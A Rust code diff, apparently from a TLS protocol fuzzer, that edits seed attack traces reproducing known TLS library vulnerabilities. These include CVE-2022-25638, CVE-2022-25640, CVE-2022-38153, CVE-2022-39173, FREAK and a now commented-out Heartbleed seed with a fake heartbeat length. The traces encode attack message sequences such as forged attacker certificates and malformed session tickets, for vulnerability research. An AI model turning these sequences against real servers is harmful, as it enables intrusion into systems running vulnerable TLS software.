@@ -70,10 +70,13 @@ pub fn seed_cve_2022_25638(server: AgentName) -> Trace<TLSProtocolTypes> {
             // Or append eve cert
             (fn_certificate_entries_make(
                 (fn_chain_append_certificate_entry(
-                (fn_certificate_entry(
-                    fn_eve_cert
-                )),
-              fn_empty_certificate_chain
+                  fn_empty_certificate_chain,
+                  (fn_certificate_entry_extensions(
+                    fn_eve_cert,
+                    (fn_cert_extensions_make(
+                        fn_cert_extensions_new
+                    ))
+                ))
             ))))
         )
     };
@@ -179,6 +182,7 @@ pub fn seed_cve_2022_25638(server: AgentName) -> Trace<TLSProtocolTypes> {
                 }),
             },
         ],
+        ..Default::default()
     }
 }
 
@@ -236,10 +240,13 @@ pub fn seed_cve_2022_25640(server: AgentName) -> Trace<TLSProtocolTypes> {
             (fn_payload_u8((fn_get_context((@certificate_request_message))))),
             (fn_certificate_entries_make(
                 (fn_chain_append_certificate_entry(
-                (fn_certificate_entry(
-                    fn_eve_cert
-                )),
-              fn_empty_certificate_chain
+                fn_empty_certificate_chain,
+                (fn_certificate_entry_extensions(
+                    fn_eve_cert,
+                    (fn_cert_extensions_make(
+                        fn_cert_extensions_new
+                    ))
+                ))
             ))))
         )
     };
@@ -312,6 +319,7 @@ pub fn seed_cve_2022_25640(server: AgentName) -> Trace<TLSProtocolTypes> {
                 }),
             },
         ],
+        ..Default::default()
     }
 }
 
@@ -392,56 +400,56 @@ pub fn seed_cve_2021_3449(server: AgentName) -> Trace<TLSProtocolTypes> {
     trace
 }
 
-pub fn seed_heartbleed(client: AgentName, server: AgentName) -> Trace<TLSProtocolTypes> {
-    let client_hello = term! {
-          fn_client_hello(
-            fn_protocol_version12,
-            fn_new_random,
-            fn_new_session_id,
-            (fn_cipher_suites_make(
-                (fn_append_cipher_suite(
-                (fn_new_cipher_suites()),
-                // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
-                fn_cipher_suite12
-            )))),
-            fn_compressions,
-            (fn_client_extensions_make(
-            (fn_client_extensions_append(
-                (fn_client_extensions_append(
-                    (fn_client_extensions_append(
-                        fn_client_extensions_new,
-                        (fn_support_group_extension(fn_named_group_secp384r1))
-                    )),
-                    fn_ec_point_formats_extension
-                )),
-                fn_signed_certificate_timestamp_extension
-            ))
-        )))
-    };
-
-    Trace {
-        prior_traces: vec![],
-        descriptors: vec![
-            TLSDescriptorConfig::new_client(client, TLSVersion::V1_2),
-            TLSDescriptorConfig::new_server(server, TLSVersion::V1_2),
-        ],
-        steps: vec![
-            Step {
-                agent: server,
-                action: Action::Input(input_action! { client_hello
-                }),
-            },
-            // Send directly after client_hello such that this does not need to be encrypted
-            Step {
-                agent: server,
-                action: Action::Input(input_action! { term! {
-                        fn_heartbeat_fake_length((fn_payload_u16(fn_empty_bytes_vec)), fn_large_length)
-                    }
-                }),
-            },
-        ],
-    }
-}
+// pub fn seed_heartbleed(client: AgentName, server: AgentName) -> Trace<TLSProtocolTypes> {
+//     let client_hello = term! {
+//           fn_client_hello(
+//             fn_protocol_version12,
+//             fn_new_random,
+//             fn_new_session_id,
+//             (fn_cipher_suites_make(
+//                 (fn_append_cipher_suite(
+//                 (fn_new_cipher_suites()),
+//                 // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+//                 fn_cipher_suite12
+//             )))),
+//             fn_compressions,
+//             (fn_client_extensions_make(
+//             (fn_client_extensions_append(
+//                 (fn_client_extensions_append(
+//                     (fn_client_extensions_append(
+//                         fn_client_extensions_new,
+//                         (fn_support_group_extension(fn_named_group_secp384r1))
+//                     )),
+//                     fn_ec_point_formats_extension
+//                 )),
+//                 fn_signed_certificate_timestamp_extension
+//             ))
+//         )))
+//     };
+//
+//     Trace {
+//         prior_traces: vec![],
+//         descriptors: vec![
+//             TLSDescriptorConfig::new_client(client, TLSVersion::V1_2),
+//             TLSDescriptorConfig::new_server(server, TLSVersion::V1_2),
+//         ],
+//         steps: vec![
+//             Step {
+//                 agent: server,
+//                 action: Action::Input(input_action! { client_hello
+//                 }),
+//             },
+//             // Send directly after client_hello such that this does not need to be encrypted
+//             Step {
+//                 agent: server,
+//                 action: Action::Input(input_action! { term! {
+//                         fn_heartbeat_fake_length((fn_payload_u16(fn_empty_bytes_vec)),
+// fn_large_length)                     }
+//                 }),
+//             },
+//         ],
+//     }
+// }
 
 pub fn seed_freak(client: AgentName, server: AgentName) -> Trace<TLSProtocolTypes> {
     Trace {
@@ -532,6 +540,7 @@ pub fn seed_freak(client: AgentName, server: AgentName) -> Trace<TLSProtocolType
                 }),
             },
         ],
+        ..Default::default()
     }
 }
 
@@ -616,6 +625,7 @@ pub fn seed_cve_2022_25640_simple(server: AgentName) -> Trace<TLSProtocolTypes> 
                 }),
             },
         ],
+        ..Default::default()
     }
 }
 
@@ -725,6 +735,124 @@ pub fn seed_cve_2022_38153(client: AgentName, server: AgentName) -> Trace<TLSPro
                 }),
             },
         ],
+        ..Default::default()
+    }
+}
+
+// Same as seed_cve_2022_38153 without the final fn_large_bytes_vec, to check whether we refind it
+// through bit-level mutations
+pub fn seed_cve_simple_2022_38153(client: AgentName, server: AgentName) -> Trace<TLSProtocolTypes> {
+    let new_session_ticket_payload = term! {
+        fn_payload_u16(((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::NewSessionTicket)))]/Vec<u8>))
+    };
+
+    let last_term = term! {
+        fn_new_session_ticket(
+            ((server, 0)/u32),
+            (@new_session_ticket_payload)
+        )
+    };
+
+    Trace {
+        prior_traces: vec![],
+        descriptors: vec![
+            TLSDescriptorConfig::new_client(client, TLSVersion::V1_2),
+            TLSDescriptorConfig::new_server(server, TLSVersion::V1_2),
+        ],
+        steps: vec![
+            OutputAction::new_step(client),
+            // Client Hello, Client -> Server
+            InputAction::new_step(
+                server,
+                term! {
+                    fn_client_hello(
+                        ((client, 0)),
+                        ((client, 0)),
+                        ((client, 0)),
+                        ((client, 0)),
+                        ((client, 0)),
+                        ((client, 0))
+                    )
+                },
+            ),
+            // Server Hello, Server -> Client
+            InputAction::new_step(
+                client,
+                term! {
+                        fn_server_hello(
+                            ((server, 0)),
+                            ((server, 0)),
+                            ((client, 0)),
+                            ((server, 0)),
+                            ((server, 0)),
+                            ((server, 0))
+                        )
+                },
+            ),
+            // Server Certificate, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_certificate(
+                            ((server, 0))
+                        )
+                    }
+                }),
+            },
+            // Server Key Exchange, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_server_key_exchange(
+                            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>)
+                        )
+                    }
+                }),
+            },
+            // Server Hello Done, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_server_hello_done
+                    }
+                }),
+            },
+            // Client Key Exchange, Client -> Server
+            Step {
+                agent: server,
+                action: Action::Input(input_action! { term! {
+                        fn_client_key_exchange(
+                            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>)
+                        )
+                    }
+                }),
+            },
+            // Client Change Cipher Spec, Client -> Server
+            Step {
+                agent: server,
+                action: Action::Input(input_action! { term! {
+                        fn_change_cipher_spec
+                    }
+                }),
+            },
+            // Client Handshake Finished, Client -> Server
+            // IMPORTANT: We are using here OpaqueMessage as the parsing code in src/io.rs does
+            // not know that the Handshake record message is encrypted. The parsed message from the
+            // could be a HelloRequest if the encrypted data starts with a 0.
+            Step {
+                agent: server,
+                action: Action::Input(input_action! { term! {
+                           (client, 3)[None] > TypeShape::of::<OpaqueMessage>()
+                    }
+                }),
+            },
+            // NewSessionTicket, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { last_term }),
+            },
+        ],
+        ..Default::default()
     }
 }
 
@@ -869,6 +997,7 @@ pub fn seed_cve_2022_39173(
                 }),
             },
         ],
+        ..Default::default()
     }
 }
 
@@ -997,6 +1126,7 @@ pub fn seed_cve_2022_39173_full(
                 }),
             },
         ],
+        ..Default::default()
     }
 }
 
@@ -1101,6 +1231,7 @@ pub fn seed_cve_2022_39173_minimized(server: AgentName) -> Trace<TLSProtocolType
                 }),
             },
         ],
+        ..Default::default()
     }
 }
 
@@ -1120,7 +1251,7 @@ pub mod tests {
             seed_cve_2022_25638.build_named_trace(),
             seed_cve_2022_25640.build_named_trace(),
             seed_cve_2021_3449.build_named_trace(),
-            seed_heartbleed.build_named_trace(),
+            // seed_heartbleed.build_named_trace(),
             seed_freak.build_named_trace(),
             seed_cve_2022_25640_simple.build_named_trace(),
             seed_cve_2022_38153.build_named_trace(),
